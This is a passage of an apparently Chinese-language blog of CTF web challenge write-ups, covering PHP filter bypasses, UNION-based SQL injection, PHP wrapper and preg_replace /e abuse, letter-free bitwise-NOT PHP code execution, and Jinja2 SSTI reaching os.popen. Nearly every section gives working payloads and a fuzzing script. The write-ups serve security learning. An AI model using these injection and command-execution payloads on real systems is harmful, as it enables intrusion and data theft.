<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>一步步来，首先是用科学计数法<code>1e9</code>绕过限制</p>
<p>然后因为会匹配并替换一次NSSCTF，这里直接双写绕过即可</p>
<p>接着是md5弱比较</p>
<p>payload：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">GET</span><span class="token punctuation">:</span> <span class="token header-value">/?num=1e9&amp;str=NSSNSSCTFCTF</span></span>
<span class="token header"><span class="token header-name keyword">POST</span><span class="token punctuation">:</span> <span class="token header-value">md5_1=QNKCDZO&amp;md5_2=240610708</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<hr>
<h1 id="NCTF-2018-滴-晨跑打卡"><a href="#NCTF-2018-滴-晨跑打卡" class="headerlink" title="[NCTF 2018]滴!晨跑打卡"></a>[NCTF 2018]滴!晨跑打卡</h1><blockquote>
<p>联合注入</p>
</blockquote>
<p>随便查询一下，发现sql语句都给了</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> pcnumber <span class="token keyword">where</span> id <span class="token operator">=</span><span class="token string">'1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>注入点在id</p>
<p>fuzz一下，发现过滤了<code>*</code>，<code>--</code>，空格</p>
<p>空格可以用<code>%a0</code>代替，用<code>&#39;</code>闭合后面的语句</p>
<p>测试回显</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'%a0union%a0select%a01,2,3,4'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231021222604660.png" alt="image-20231021222604660"></p>
<p>爆数据库</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'%a0union%a0select%a01,2,database(),4'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到数据库cgctf</p>
<p>爆表</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'%a0union%a0select%a01,2,group_concat(table_name),4%a0from%a0information_schema.tables%a0where%a0table_schema="cgctf"'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到表pcnumber</p>
<p>爆列名</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'%a0union%a0select%a01,2,group_concat(column_name),4%a0from%a0information_schema.columns%a0where%a0table_name="pcnumber"'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>得到列名id,bigtime,smalltime,flag</p>
<p>爆字段</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">0</span><span class="token string">'%a0union%a0select%a01,2,(select%a0group_concat(flag)from%a0pcnumber),4'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="BJDCTF-2020-ZJCTF，不过如此"><a href="#BJDCTF-2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF 2020]ZJCTF，不过如此"></a>[BJDCTF 2020]ZJCTF，不过如此</h1><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$text</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"text"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string double-quoted-string">"I have a dream"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;br>&lt;h1>"</span><span class="token operator">.</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h1>&lt;/br>"</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/"</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Not now!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//next.php</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第一步可以用data伪协议，data伪协议可以作为文件内容来读取</p>
<p>第二步用php伪协议base64编码读取next.php</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>text<span class="token operator">=</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>next.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$id</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span>
        <span class="token string single-quoted-string">'/('</span> <span class="token operator">.</span> <span class="token variable">$re</span> <span class="token operator">.</span> <span class="token string single-quoted-string">')/ei'</span><span class="token punctuation">,</span>
        <span class="token string single-quoted-string">'strtolower("\\1")'</span><span class="token punctuation">,</span>
        <span class="token variable">$str</span>
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$re</span> <span class="token operator">=></span> <span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span> <span class="token function">complex</span><span class="token punctuation">(</span><span class="token variable">$re</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
	@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>考了preg_replace和正则e模式的利用，参考<a href="https://c1oudfl0w0.github.io/blog/2023/10/03/SHCTF2023/#ezphp">SHCTF的ezphp</a><del>（爹像儿子了属于是）</del></p>
<p>这里的匹配模式选择<code>\S*</code>，然后执行<code>$&#123;phpinfo()&#125;</code>查看环境变量即可</p>
<p>payload：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>next<span class="token operator">.</span>php<span class="token operator">?</span>\<span class="token constant">S</span><span class="token operator">*=</span><span class="token variable">$</span><span class="token punctuation">&#123;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="鹏城杯-2022-简单的php"><a href="#鹏城杯-2022-简单的php" class="headerlink" title="[鹏城杯 2022]简单的php"></a>[鹏城杯 2022]简单的php</h1><blockquote>
<p>无数字字母rce+无参rce</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">80</span> <span class="token keyword">or</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[A-Za-z0-9]|\'|"|`|\ |,|\.|-|\+|=|\/|\\|&lt;|>|\$|\?|\^|&amp;|\|/is'</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">' Hello'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\s\(\)]+?\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        @<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>第一层过滤是无数字字母rce，第二层过滤是无参rce</p>
<p>php版本7.2.34，同时注意到限制了长度不能超过80，考虑getallheaders参数逃逸，这里用取反</p>
<p>注：固定写法，<code>[!%FF]</code>作为()的衔接，用二维数组进行拼接需要<code>[!%FF]</code>分割，<code>[!%FF]</code>是0的意思，因为前面是个数组，取里面的第0项才是木马</p>
<p>打印请求头<code>print_r(getallheaders());</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>code<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">8</span>F<span class="token operator">%</span><span class="token number">8</span>D<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">91</span><span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token constant">A0</span><span class="token operator">%</span><span class="token number">8</span>D<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">%</span>ff<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token operator">~</span><span class="token operator">%</span><span class="token number">98</span><span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">93</span><span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">9</span>E<span class="token operator">%</span><span class="token number">9</span>B<span class="token operator">%</span><span class="token number">9</span>A<span class="token operator">%</span><span class="token number">8</span>D<span class="token operator">%</span><span class="token number">8</span>C<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">!</span><span class="token operator">%</span>ff<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231022095657917.png" alt="image-20231022095657917"></p>
<p>直接用next指向ua头伪造即可<code>system(next(getallheaders()));</code></p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http">?code=[~%8C%86%8C%8B%9A%92][!%ff]([~%91%9A%87%8B][!%ff]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%ff]()));
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">ls /</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231022100033850.png" alt="image-20231022100033850"></p>
<hr>
<h1 id="GXYCTF-2019-BabySqli"><a href="#GXYCTF-2019-BabySqli" class="headerlink" title="[GXYCTF 2019]BabySqli"></a>[GXYCTF 2019]BabySqli</h1><blockquote>
<p>sql注入union创建虚拟表</p>
</blockquote>
<p>点击登录来到search.php</p>
<p>ctrl+u发现源码hint，base解码一下得到sql语句</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'$name'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>是单引号闭合</p>
<p>fuzz一下，ban掉了or，(，)，&#x3D;，information_schema，order</p>
<p>测试了一下，发现在用户名为admin的时候才会返回wrong pass，用户名应该就是admin</p>
<p>然后测试列数，用大写替换就可以绕过order的过滤了</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">name<span class="token operator">=</span>admin' <span class="token keyword">ORDER</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>测试到4时报错，说明里面只有三列</p>
<p>接下来就是爆库了，但是过滤了括号，意味着函数基本上是用不了的</p>
<p>这个时候就要用<code>union</code>创建虚拟表（mysql的特性：参考<a href="https://c1oudfl0w0.github.io/blog/2023/08/05/ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%93%E9%A2%98/#%E6%9E%84%E9%80%A0%E4%B8%B4%E6%97%B6%E7%94%A8%E6%88%B7%EF%BC%89">https://c1oudfl0w0.github.io/blog/2023/08/05/ctfshow-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%93%E9%A2%98/#%E6%9E%84%E9%80%A0%E4%B8%B4%E6%97%B6%E7%94%A8%E6%88%B7）</a></p>
<p>本地测试：（我这边的表只有3列）</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231022104800438.png" alt="image-20231022104800438"></p>
<p>可以看到最下面那行生成了我们自己定义好的数据，而这行数据是临时的，实际上没有保存在数据库中</p>
<p>而这题就是利用这个方法，我们已经知道了用户名admin，但是密码不知道，这时候就可以用union创建一个虚拟的数据，然后进行查询，这样就能返回正常值</p>
<p>本地测试：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token string">"username"</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231022105128908.png" alt="image-20231022105128908"></p>
<p>回到题目，测试的时候发现给pw传入一个数组会返回md5函数的报错信息，可知密码那部分需要进行md5加密</p>
<p>注意：后面创建了虚拟表，前面就不要再查admin了</p>
<p>payload：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">name<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"c4ca4238a0b923820dcc509a6f75849b"</span><span class="token comment">#&amp;pw=1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<hr>
<h1 id="安洵杯-2020-Normal-SSTI"><a href="#安洵杯-2020-Normal-SSTI" class="headerlink" title="[安洵杯 2020]Normal SSTI"></a>[安洵杯 2020]Normal SSTI</h1><blockquote>
<p>ssti</p>
</blockquote>
<p>按照要求传值</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231022105639028.png" alt="image-20231022105639028"></p>
<p>明显存在ssti注入</p>
<p>fuzz脚本：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

ssti_char <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"&#123;&#123;&#125;&#125;"</span><span class="token punctuation">,</span> <span class="token string">"'"</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'""'</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"os"</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">,</span> <span class="token string">"|attr"</span><span class="token punctuation">,</span> <span class="token string">"[]"</span><span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">,</span> <span class="token string">"pop"</span><span class="token punctuation">,</span>
    <span class="token string">"class"</span><span class="token punctuation">,</span> <span class="token string">"bases"</span><span class="token punctuation">,</span> <span class="token string">"mro"</span><span class="token punctuation">,</span> <span class="token string">"subclasses"</span><span class="token punctuation">,</span> <span class="token string">"globals"</span><span class="token punctuation">,</span> <span class="token string">"init"</span><span class="token punctuation">,</span> <span class="token string">"subprocess"</span><span class="token punctuation">,</span>
    <span class="token string">"lipsum"</span><span class="token punctuation">,</span> <span class="token string">"get"</span><span class="token punctuation">,</span> <span class="token string">"set"</span><span class="token punctuation">,</span> <span class="token string">"join"</span><span class="token punctuation">,</span><span class="token string">" "</span>
<span class="token punctuation">]</span>
url <span class="token operator">=</span> <span class="token string">"http://node4.anna.nssctf.cn:28483/test"</span>
header <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span>
    <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'</span><span class="token punctuation">,</span>
    <span class="token string">'Accept'</span><span class="token punctuation">:</span>
    <span class="token string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'</span><span class="token punctuation">,</span>
    <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span>
    <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>
    <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> char <span class="token keyword">in</span> ssti_char<span class="token punctuation">:</span>
    <span class="token comment">#post_data = "tt=1" + char  #+ "&amp;username=1#"</span>
    <span class="token comment">#res = requests.post(url, data=post_data, headers=header)</span>
    get_data <span class="token operator">=</span> <span class="token string">"url="</span> <span class="token operator">+</span> char
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>get_data<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">'do a real p1g'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"不可用: &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"可用: &#123;0&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>fuzz一下，发现过滤了<code>&#123;&#123;&#125;&#125;</code>，<code>&#39;</code>，<code>&quot;&quot;</code>，<code>_</code>，<code>.</code>，<code>[]</code>，<code>request</code>，<code>globals</code>，<code>set</code>，<code>get</code>，空格</p>
<p><code>&#123;&#123;&#125;&#125;</code>可以用<code>&#123;%print%&#125;</code>替换</p>
<p><code>.</code>，<code>[]</code>可以用<code>|attr</code>来调用方法：<code>&#39;&#39;|attr(&quot;__class__&quot;)</code>等价于<code>&#39;&#39;.__class__</code>，<code>xxx|attr(&quot;os&quot;)(&#39;xxx&#39;)</code>等价于<code>xxx.os(&#39;xxx&#39;)</code></p>
<p>下划线被过滤了，考虑用unicode编码绕过</p>
<p>过滤了成对引号的话，拿不到我们需要的subclasses，得用lipsum方法来命令执行：<code>lipsum|attr(&quot;__globals__&quot;)</code></p>
<p>查找模块</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>test?url<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token keyword">print</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>找到os模块</p>
<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231022113051299.png" alt="image-20231022113051299"></p>
<p>获取os模块<code>lipsum|attr(&quot;__globals__&quot;)|attr(&quot;get&quot;)(&quot;os&quot;)</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>test?url<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token keyword">print</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\u0067\u0065\u0074"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/blog/2023/10/16/NSSCTF-web-%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%951/image-20231022113531268.png" alt="image-20231022113531268"></p>
<p>获取popen方法并命令执行<code>lipsum|attr(&quot;__globals__&quot;).get(&quot;os&quot;).popen(&quot;ls&quot;).read()</code></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">/</span>test?url<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token operator">%</span><span class="token keyword">print</span><span class="token punctuation">(</span>lipsum<span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\u005F\u005F\u0067\u006C\u006F\u0062\u0061\u006C\u0073\u005F\u005F"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"\u0067\u0065\u0074"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"os"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"popen"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token operator">|</span>attr<span class="token punctuation">(</span><span class="token string">"read"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>读到的app.py</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

url_black_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"%1c"</span><span class="token punctuation">,</span> <span class="token string">"%1d"</span><span class="token punctuation">,</span> <span class="token string">"%1f"</span><span class="token punctuation">,</span> <span class="token string">"%1e"</span><span class="token punctuation">,</span> <span class="token string">"%20"</span><span class="token punctuation">,</span> <span class="token string">"%2b"</span><span class="token punctuation">,</span> <span class="token string">"%2c"</span><span class="token punctuation">,</span> <span class="token string">"%3c"</span><span class="token punctuation">,</span> <span class="token string">"%3e"</span>
<span class="token punctuation">]</span>
black_list <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token string">"["</span><span class="token punctuation">,</span> <span class="token string">"]"</span><span class="token punctuation">,</span> <span class="token string">"&#123;&#123;"</span><span class="token punctuation">,</span> <span class="token string">"="</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">,</span> <span class="token string">"\\"</span><span class="token punctuation">,</span> <span class="token string">'""'</span><span class="token punctuation">,</span> <span class="token string">"\\x"</span><span class="token punctuation">,</span> <span class="token string">"request"</span><span class="token punctuation">,</span> <span class="token string">"config"</span><span class="token punctuation">,</span>
    <span class="token string">"session"</span><span class="token punctuation">,</span> <span class="token string">"url_for"</span><span class="token punctuation">,</span> <span class="token string">"g"</span><span class="token punctuation">,</span> <span class="token string">"get_flashed_messages"</span><span class="token punctuation">,</span> <span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"for"</span><span class="token punctuation">,</span> <span class="token string">"if"</span><span class="token punctuation">,</span>
